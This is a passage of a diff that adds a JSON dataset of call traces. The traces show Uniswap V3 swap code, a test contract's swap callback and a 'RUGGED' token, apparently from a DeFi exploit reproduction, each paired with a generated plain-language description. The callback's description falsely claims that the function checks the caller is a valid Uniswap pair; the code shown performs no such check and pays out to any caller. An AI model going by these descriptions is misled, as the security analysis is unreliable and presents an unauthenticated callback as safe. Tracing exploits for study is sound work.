state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n            } else {\n                state.amountSpecifiedRemaining += step.amountOut.toInt256();\n                state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n            }\n\n            // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee\n            if (cache.feeProtocol > 0) {\n                uint256 delta = step.feeAmount / cache.feeProtocol;\n                step.feeAmount -= delta;\n                state.protocolFee += uint128(delta);\n            }\n\n            // update global fee tracker\n            if (state.liquidity > 0)\n                state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n\n            // shift tick if we reached the next price\n            if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n                // if the tick is initialized, run the tick transition\n                if (step.initialized) {\n                    // check for the placeholder value, which we replace with the actual value the first time the swap\n                    // crosses an initialized tick\n                    if (!cache.computedLatestObservation) {\n                        (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                            cache.blockTimestamp,\n                            0,\n                            slot0Start.tick,\n                            slot0Start.observationIndex,\n                            cache.liquidityStart,\n                            slot0Start.observationCardinality\n                        );\n                        cache.computedLatestObservation = true;\n                    }\n                    int128 liquidityNet =\n                        ticks.cross(\n                            step.tickNext,\n                            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                            cache.secondsPerLiquidityCumulativeX128,\n                            cache.tickCumulative,\n                            cache.blockTimestamp\n                        );\n                    // if we're moving leftward, we interpret liquidityNet as the opposite sign\n                    // safe because liquidityNet cannot be type(int128).min\n                    if (zeroForOne) liquidityNet = -liquidityNet;\n\n                    state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n                }\n\n                state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n            } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n                // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved\n                state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n            }\n        }\n\n        // update tick and write an oracle entry if the tick change\n        if (state.tick != slot0Start.tick) {\n            (uint16 observationIndex, uint16 observationCardinality) =\n                observations.write(\n                    slot0Start.observationIndex,\n                    cache.blockTimestamp,\n                    slot0Start.tick,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality,\n                    slot0Start.observationCardinalityNext\n                );\n            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n                state.sqrtPriceX96,\n                state.tick,\n                observationIndex,\n                observationCardinality\n            );\n        } else {\n            // otherwise just update the price\n            slot0.sqrtPriceX96 = state.sqrtPriceX96;\n        }\n\n        // update liquidity if it changed\n        if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n\n        // update fee growth global and, if necessary, protocol fees\n        // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees\n        if (zeroForOne) {\n            feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token0 += state.protocolFee;\n        } else {\n            feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token1 += state.protocolFee;\n        }\n\n        (amount0, amount1) = zeroForOne == exactInput\n            ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n            : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n\n        // do the transfers and collect payment\n        if (zeroForOne) {\n            if (amount1 < 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n\n            uint256 balance0Before = balance0();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance0Before.add(uint256(amount0)) <= balance0(), 'IIA');\n        } else {\n            if (amount0 < 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n\n            uint256 balance1Before = balance1();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance1Before.add(uint256(amount1)) <= balance1(), 'IIA');\n        }\n\n        emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n        slot0.unlocked = true;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+        "description": "1. **Core functions**:  \n   The `swap` function is designed to facilitate a token swap within a decentralized exchange (DEX) pool. It allows users to exchange one token for another based on the current market price and liquidity in the pool. The function handles the logic for calculating the swap amounts, updating the pool's state (such as price and liquidity), and ensuring the swap is executed correctly. It also manages fees and tracks protocol-related data during the swap process.\n\n2. **Security mechanism**:  \n   - **`noDelegateCall`**: This modifier prevents the function from being called through a delegate call, which could lead to unexpected behavior or vulnerabilities.  \n   - **`require` statements**: These checks ensure that the swap is valid by verifying conditions like the amount being non-zero, the pool being unlocked, and the price limit being within acceptable bounds.  \n   - **Locking mechanism**: The `slot0.unlocked` flag is set to `false` during the swap to prevent reentrancy attacks and ensure the pool state is updated atomically.  \n   - **Balance checks**: After the swap, the function verifies that the token balances have been updated correctly to prevent any manipulation or errors.  \n\n3. **Parameter Function**:  \n   - **`recipient`**: The address that will receive the swapped tokens.  \n   - **`zeroForOne`**: A boolean indicating the direction of the swap. If `true`, it means swapping token 0 for token 1; if `false`, it\u2019s the opposite.  \n   - **`amountSpecified`**: The amount of tokens the user wants to swap. A positive value means the user is providing tokens, while a negative value means the user is receiving tokens.  \n   - **`sqrtPriceLimitX96`**: The price limit for the swap, ensuring the swap doesn\u2019t go beyond a certain price point.  \n   - **`data`**: Additional data that can be passed to the swap callback function, often used for custom logic or integration with other contracts.  \n\n4. **Return description**:  \n   The function returns two values: `amount0` and `amount1`, which represent the amounts of token 0 and token 1 involved in the swap. The calculation logic depends on the direction of the swap (`zeroForOne`) and whether the user is providing or receiving tokens (`exactInput`). The function adjusts these amounts based on the remaining input/output and the calculated swap steps, ensuring the correct amounts are transferred to the recipient.  \n\n**In summary**, the `swap` function enables token swaps in a DEX pool, ensuring security through various checks and mechanisms. It calculates the swap amounts based on user inputs and updates the pool state accordingly, while also handling fees and preventing potential vulnerabilities.",
+        "return_value": "0x000000000000000000000000000000000000000000000000fa072f84d45cd200fffffffffffffffffffffffffffffffffffffffffffffffff1ca8c1ff38c152b"
+    },
+    {
+        "id": "25962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1023851896415447765 [1.023e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "630",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "356631570739218611936 [3.566e20]"
+    },
+    {
+        "id": "576330",
+        "args": "18016421081864000000 [1.801e19], -1023851896415447765 [-1.023e18], 0x61",
+        "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle a callback during a swap operation on Uniswap V3. Its main role is to transfer tokens back to the sender (the Uniswap pair contract) based on the amount of tokens involved in the swap. If `amount0Delta` is positive, it transfers the corresponding token0 amount. If `amount1Delta` is positive, it transfers the corresponding token1 amount. This ensures the swap is completed by sending the required tokens to the Uniswap pair.\n\n2. **Security mechanism**:  \n   The function uses the `external` modifier, meaning it can only be called from outside the contract, ensuring it is triggered by the Uniswap pair contract. It also checks the values of `amount0Delta` and `amount1Delta` to ensure only one of them is positive, preventing unintended transfers. Additionally, the `msg.sender` is used to verify the caller is a valid Uniswap pair contract, adding a layer of trust.\n\n3. **Parameter Function**:  \n   - `amount0Delta`: Represents the change in the amount of token0 involved in the swap. If positive, it indicates token0 needs to be transferred.  \n   - `amount1Delta`: Represents the change in the amount of token1 involved in the swap. If positive, it indicates token1 needs to be transferred.  \n   - `data`: Additional data passed to the function, though it is not used in this specific implementation.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs a transfer of tokens based on the input parameters. If `amount0Delta` is positive, it transfers token0; if `amount1Delta` is positive, it transfers token1. This ensures the swap is completed by sending the required tokens to the Uniswap pair contract.  \n\n**In summary**, this function acts as a callback to complete a swap on Uniswap V3 by transferring the necessary tokens to the pair contract. It ensures security by verifying the caller and only transferring tokens when required.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "266",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F]"
+    },
+    {
+        "id": "573788",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], 18016421081864000000 [1.801e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "630",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "374647991821082611936 [3.746e20]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1023851896415447765 [1.023e18]"
+    }
+]
